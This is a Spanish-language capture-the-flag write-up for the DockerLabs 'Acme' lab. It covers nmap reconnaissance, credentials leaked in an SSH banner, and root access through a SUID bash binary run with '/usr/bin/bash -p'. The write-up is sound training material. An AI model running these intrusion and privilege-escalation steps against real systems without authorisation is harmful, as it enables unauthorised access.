# DockerLabs — Writeup: Acme (Muy Fácil)

> Laboratorio/CTF autorizado de DockerLabs. Este writeup documenta únicamente la resolución de la máquina **Acme**, catalogada como **Muy Fácil**.

En esta máquina trabajamos una cadena sencilla pero muy útil para principiantes:

- Comprobación de conectividad.
- Enumeración con **Nmap**.
- Revisión de una pista expuesta por el servicio web.
- Enumeración del banner de **SSH**.
- Obtención de credenciales temporales.
- Acceso inicial mediante SSH.
- Enumeración de binarios con bit **SUID**.
- Escalada de privilegios abusando de **Bash SUID**.

---

## 1. Reconocimiento inicial

Comenzamos comprobando que la máquina objetivo responde en la red:

```bash
ping -c 1 172.17.0.2
```

La respuesta confirma que el host se encuentra activo y accesible desde nuestra máquina atacante.

<img width="501" height="144" alt="Captura de pantalla 2026-10-01 103127 - copia" src="https://github.com/user-attachments/assets/d5c90c8e-7826-447a-bbc2-f4792835f146" />


---

## 2. Enumeración de puertos y servicios

Realizamos un escaneo completo de puertos TCP con Nmap:

```bash
nmap -sS -sCV -Pn -n 172.17.0.2
```

Las opciones utilizadas nos permiten realizar un SYN Scan, ejecutar scripts básicos de NSE e identificar versiones de los servicios detectados.

Los puertos relevantes encontrados son:

```text
22/tcp open  ssh   OpenSSH 8.9p1
80/tcp open  http  Apache httpd 2.4.52
```

Además, Nmap detecta una entrada interesante en `robots.txt`:

```text
/_migration_notes.txt
```

También identifica el título de la aplicación web:

```text
ACME Corporation - Portal en Mantenimiento
```

<img width="773" height="353" alt="Captura de pantalla 2026-10-01 103133 - copia" src="https://github.com/user-attachments/assets/c3e47de9-d176-4c2a-b347-e4849dbff1c6" />


---

## 3. Enumeración del servicio web

Al acceder al servidor web mediante:

```text
http://172.17.0.2
```

nos encontramos con el portal de infraestructura de ACME en modo mantenimiento.

La propia aplicación proporciona una pista muy clara: el acceso a las consolas de gestión se realiza mediante **SSH** y recomienda iniciar una conexión con cualquier usuario para consultar el aviso del sistema.

<img width="1048" height="768" alt="Captura de pantalla 2026-10-01 103219" src="https://github.com/user-attachments/assets/124316e4-200e-40c4-9906-8df4ec884c76" />


Durante el reconocimiento también revisamos el archivo encontrado por Nmap:

```text
http://172.17.0.2/migration_notes.txt
```

El memorando confirma que el acceso al servidor se canaliza por el puerto 22 y que debemos consultar el banner de conexión SSH.

<img width="955" height="241" alt="Captura de pantalla 2026-10-01 103443" src="https://github.com/user-attachments/assets/f0e45e74-e19e-4248-9638-8b1771850fae" />


Este paso demuestra por qué es importante revisar archivos expuestos por el servidor web y prestar atención a cualquier información obtenida durante la enumeración.

---

## 4. Enumeración del banner SSH

Siguiendo la pista anterior, intentamos iniciar una conexión SSH utilizando un usuario cualquiera:

```bash
ssh test@172.17.0.2
```

Antes de completar la autenticación, el servidor muestra un banner de mantenimiento que expone credenciales temporales:

```text
Usuario: usuario
Password: P@ssw0rd2026_CTF!
```

<img width="683" height="268" alt="Captura de pantalla 2026-10-01 103557" src="https://github.com/user-attachments/assets/0dc28588-f7cd-4f2d-98ec-2c26a5214210" />


Esto supone una **divulgación de información sensible**, ya que un usuario no autenticado puede obtener credenciales válidas simplemente iniciando una conexión al servicio SSH.

---

## 5. Acceso inicial mediante SSH

Utilizamos las credenciales obtenidas en el banner:

```bash
ssh usuario@172.17.0.2
```

Tras autenticarnos correctamente conseguimos una shell como el usuario:

```text
usuario
```

Comprobamos nuestra identidad:

```bash
whoami
```

Después enumeramos el directorio personal y encontramos la flag de usuario:

```bash
ls
cat user.txt
```

Resultado:

```text
FLAG{nmap_recon_ssh_foothold_7a9f24e1}
```

<img width="770" height="584" alt="Captura de pantalla 2026-10-01 103649" src="https://github.com/user-attachments/assets/6d4e1ef0-f5d7-46f6-a468-f96816a92fe2" />


Con esto obtenemos nuestro **foothold** o acceso inicial al sistema.

---

## 6. Enumeración local y búsqueda de SUID

Una vez dentro del sistema comenzamos la enumeración local.

Primero verificamos el UID y los grupos del usuario actual:

```bash
id
```

A continuación buscamos archivos que tengan activado el bit **SUID**:

```bash
find / -perm -4000 2>/dev/null
```

El significado del comando es el siguiente:

- `find /`: busca desde la raíz del sistema.
- `-perm -4000`: localiza archivos con el bit SUID activado.
- `2>/dev/null`: oculta los errores de permisos enviados a `stderr`.

Entre los resultados aparece:

```text
/usr/bin/bash
```

<img width="537" height="251" alt="Captura de pantalla 2026-10-01 103852" src="https://github.com/user-attachments/assets/8fe58b3a-369d-47ad-a5a1-316ea0e26951" />


Que `/usr/bin/bash` tenga SUID activado es una configuración muy peligrosa si el binario pertenece a `root`.

El bit SUID permite que un programa se ejecute utilizando el **UID efectivo del propietario del archivo** en lugar del UID del usuario que lo ejecuta.

---

## 7. Escalada de privilegios con Bash SUID

Aprovechamos la configuración insegura ejecutando Bash en modo privilegiado:

```bash
/usr/bin/bash -p
```

La opción `-p` hace que Bash conserve los privilegios efectivos en lugar de descartarlos.

Comprobamos nuestra identidad:

```bash
whoami
```

El resultado es:

```text
root
```

Ya con privilegios máximos navegamos al directorio de root:

```bash
cd /
cd root
ls
cat root.txt
```

Y obtenemos la flag final:

```text
FLAG{wpShell_cve_2026_63030_core_rce_root_99d10c8b}
```

<img width="658" height="228" alt="Captura de pantalla 2026-10-01 104036" src="https://github.com/user-attachments/assets/aaa2bc68-6bef-44a1-b459-0089bab91f38" />


---

## 8. Resumen de la cadena de ataque

```text
Reconocimiento
      ↓
Ping
      ↓
Nmap
      ↓
Puerto 80 + robots.txt
      ↓
/migration_notes.txt
      ↓
Pista para revisar SSH
      ↓
Banner SSH
      ↓
Credenciales temporales expuestas
      ↓
SSH como usuario
      ↓
Enumeración SUID
      ↓
/usr/bin/bash con SUID
      ↓
/usr/bin/bash -p
      ↓
ROOT
```

---

## 9. Vulnerabilidades encontradas

| Vulnerabilidad / mala configuración | Impacto |
|---|---|
| Información sensible expuesta en el servicio web | Facilita la enumeración del servicio SSH |
| Credenciales expuestas en banner SSH | Acceso inicial con usuario válido |
| Bash con bit SUID activado | Escalada local directa a `root` |

---

## 10. Conclusión

**Acme** es una máquina muy sencilla, pero resulta útil para practicar una metodología básica de pentesting:

```text
Enumerar → analizar pistas → obtener acceso → enumerar localmente → escalar privilegios
```

La máquina también deja una lección importante: no siempre es necesario utilizar un exploit complejo o un CVE. Una mala configuración aparentemente pequeña, como exponer credenciales en un banner o asignar SUID a Bash, puede terminar provocando la **comprometición total del sistema**.
